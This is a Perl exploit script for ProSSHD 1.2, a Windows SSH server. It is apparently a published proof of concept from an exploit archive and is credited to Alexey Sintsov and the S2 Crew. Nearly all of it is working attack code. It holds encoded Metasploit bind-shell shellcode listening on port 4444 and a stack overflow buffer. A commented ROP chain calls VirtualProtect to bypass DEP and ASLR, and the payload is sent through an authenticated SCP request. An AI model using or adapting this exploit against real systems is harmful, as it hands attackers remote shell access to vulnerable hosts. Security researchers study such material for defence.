# Exploit Title: ProSSHD 1.2 remote post-auth exploit (w/ASLR and DEP bypass)
# Date: 03.05.2010
# Author: Alexey Sintsov
# Version: 1.2
# Tested on: Windows XP SP3 / Windows 7
# CVE : 
# Code : 

################################################################################
# Original exploit by S2 Crew [Hungary] 
# * * *
# ROP for DEP and ASLR bypass by Alexey Sintsov from DSecRG [www.dsecrg.com]
# * * *
# Tested on:  ProSSHD v1.2 on Windows XP and Windows 7 with DEP for all
# 
# Special for XAKEP magazine  [www.xakep.ru]
#
#
# CVE: - 
  
#!/usr/bin/perl 
  
use Net::SSH2; 
  
$username = ''; 
$password = ''; 
  
$host = '192.168.126.129';  #Remote host
#$host = '192.168.13.6'; 
$port = 22; 
  

# windows/shell_bind_tcp - 368 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# LPORT=4444, RHOST=, EXITFUNC=process, InitialAutoRunScript=, 
# AutoRunScript=
$shell = 
"\xba\xda\x29\x13\xda\xd9\xe9\xd9\x74\x24\xf4\x58\x31\xc9" .
"\xb1\x56\x31\x50\x13\x83\xc0\x04\x03\x50\xd5\xcb\xe6\x26" .
"\x01\x82\x09\xd7\xd1\xf5\x80\x32\xe0\x27\xf6\x37\x50\xf8" .
"\x7c\x15\x58\x73\xd0\x8e\xeb\xf1\xfd\xa1\x5c\xbf\xdb\x8c" .
"\x5d\x71\xe4\x43\x9d\x13\x98\x99\xf1\xf3\xa1\x51\x04\xf5" .
"\xe6\x8c\xe6\xa7\xbf\xdb\x54\x58\xcb\x9e\x64\x59\x1b\x95" .
"\xd4\x21\x1e\x6a\xa0\x9b\x21\xbb\x18\x97\x6a\x23\x13\xff" .
"\x4a\x52\xf0\xe3\xb7\x1d\x7d\xd7\x4c\x9c\x57\x29\xac\xae" .
"\x97\xe6\x93\x1e\x1a\xf6\xd4\x99\xc4\x8d\x2e\xda\x79\x96" .
"\xf4\xa0\xa5\x13\xe9\x03\x2e\x83\xc9\xb2\xe3\x52\x99\xb9" .
"\x48\x10\xc5\xdd\x4f\xf5\x7d\xd9\xc4\xf8\x51\x6b\x9e\xde" .
"\x75\x37\x45\x7e\x2f\x9d\x28\x7f\x2f\x79\x95\x25\x3b\x68" .
"\xc2\x5c\x66\xe5\x27\x53\x99\xf5\x2f\xe4\xea\xc7\xf0\x5e" .
"\x65\x64\x79\x79\x72\x8b\x50\x3d\xec\x72\x5a\x3e\x24\xb1" .
"\x0e\x6e\x5e\x10\x2e\xe5\x9e\x9d\xfb\xaa\xce\x31\x53\x0b" .
"\xbf\xf1\x03\xe3\xd5\xfd\x7c\x13\xd6\xd7\x0b\x13\x18\x03" .
"\x58\xf4\x59\xb3\x4f\x58\xd7\x55\x05\x70\xb1\xce\xb1\xb2" .
"\xe6\xc6\x26\xcc\xcc\x7a\xff\x5a\x58\x95\xc7\x65\x59\xb3" .
"\x64\xc9\xf1\x54\xfe\x01\xc6\x45\x01\x0c\x6e\x0f\x3a\xc7" .
"\xe4\x61\x89\x79\xf8\xab\x79\x19\x6b\x30\x79\x54\x90\xef" .
"\x2e\x31\x66\xe6\xba\xaf\xd1\x50\xd8\x2d\x87\x9b\x58\xea" .
"\x74\x25\x61\x7f\xc0\x01\x71\xb9\xc9\x0d\x25\x15\x9c\xdb" .
"\x93\xd3\x76\xaa\x4d\x8a\x25\x64\x19\x4b\x06\xb7\x5f\x54" .
"\x43\x41\xbf\xe5\x3a\x14\xc0\xca\xaa\x90\xb9\x36\x4b\x5e" .
"\x10\xf3\x7b\x15\x38\x52\x14\xf0\xa9\xe6\x79\x03\x04\x24" .
"\x84\x80\xac\xd5\x73\x98\xc5\xd0\x38\x1e\x36\xa9\x51\xcb" .
"\x38\x1e\x51\xde";


  
$fuzz = "\x41"x491 .  # buffer before RET addr rewriting

###############################   ROP   
# All ROP instructions from non ASLR modules (coming with ProSHHD distrib): MSVCR71.DLL and MFC71.DLL   
# For DEP bypass used VirtualProtect call from non ASLR DLL - 0x7C3528DD (MSVCR71.DLL)
# this make stack executable:

#### RET rewrite###
"\x9F\x07\x37\x7C".  # MOV EAX, EDI / POP EDI / POP ESI / RETN 	; EAX points on our stack data with some offset

"\x11\x11\x11\x11".  # JUNK---------------^^^       ^^^  
"\x22\x22\x22\x22".  # JUNK-------------------------^^^ 
"\x27\x34\x34\x7C".  # MOV ECX, EAX / MOV EAX, ESI / POP ESI / RETN 10
"\x33\x33\x33\x33".  # JUNK------------------------------^^^ 

"\xC1\x4C\x34\x7C".  # POP EAX  / RETN
                     #     ^^^ 
"\x33\x33\x33\x33".  #     ^^^
"\x33\x33\x33\x33".  #     ^^^
"\x33\x33\x33\x33".  #     ^^^
"\x33\x33\x33\x33".  #     ^^^
                     #     ^^^
"\xC0\xFF\xFF\xFF".  # ----^^^  Param for next instruction...
"\x05\x1e\x35\x7C".  # NEG EAX /  RETN 	   ; EAX will be 0x40 (param for VirtualProtect)

"\xc8\x03\x35\x7C".  # MOV DS:[ECX], EAX / RETN    ; save 0x40 (3 param)
"\x40\xa0\x35\x7C".  # MOV EAX, ECX / RETN		   ; restore pointer in EAX 

"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN             ; Change position
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN						
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN				; EAX=ECX-0x0c

"\x08\x94\x16\x7C".  # MOV DS:[EAX+0x4], EAX / RETN ;save addres for VirtualProtect (1 param)

"\xB9\x1F\x34\x7C".  # INC EAX / RETN				; oh ... and move pointer back
"\xB9\x1F\x34\x7C".  # INC EAX / RETN
"\xB9\x1F\x34\x7C".  # INC EAX / RETN
"\xB9\x1F\x34\x7C".  # INC EAX / RETN				; EAX=ECX=0x8

"\xB2\x01\x15\x7C".  # MOV [EAX+0x4], 1			; size for VirtualProtect (2 param)

"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN             ; Change position for output from VirtualProtect
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN						
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN
"\xA1\x1D\x34\x7C".  # DEC EAX  / RETN

"\x27\x34\x34\x7C".  # MOV ECX, EAX / MOV EAX, ESI / POP ESI / RETN 10
"\x33\x33\x33\x33".  # JUNK------------------------------^^^ 

"\x40\xa0\x35\x7C".  # MOV EAX, ECX / RETN		   ; restore pointer in EAX 
                     #      
"\x33\x33\x33\x33".  #     
"\x33\x33\x33\x33".  #     
"\x33\x33\x33\x33".  #     
"\x33\x33\x33\x33".  #     

"\xB9\x1F\x34\x7C".  # INC EAX / RETN			   ; and again... 
"\xB9\x1F\x34\x7C".  # INC EAX / RETN
"\xB9\x1F\x34\x7C".  # INC EAX / RETN
"\xB9\x1F\x34\x7C".  # INC EAX / RETN

"\xE5\x6B\x36\x7C".   # MOV DS:[EAX+0x14], ECX             ; save output addr for VirtualProtect (4 param)

"\xBA\x1F\x34\x7C"x204 . # RETN fill.....

"\xDD\x28\x35\x7C".  # CALL VirtualProtect / LEA ESP, [EBP-58] / POP EDI / ESI / EBX / RETN  ;Call VirtualProtect 
"AAAABBBBCCCCDDDD".   # Here is place for params (VirtualProtect) 

####################### retrun into stack after VirtualProtect
"\x1A\xF2\x35\x7C".   # ADD ESP, 0xC / RETN                        ; take next ret 
"XXXYYYZZZ123".       # trash
"\x30\x5C\x34\x7C".   # 0x7c345c2e: ANDPS XMM0, XMM3  -- (+0x2 to address and....)  --> PUSH ESP / RETN ; EIP=ESP

"\x90"x14 .           # NOPs here is the begining of shellcode

$shell; 	      # shellcode 8)
	
  
$ssh2 = Net::SSH2->new(); 
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; 
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n"; 
#sleep(10);
$scpget = $ssh2->scp_get($fuzz); 
$ssh2->disconnect();

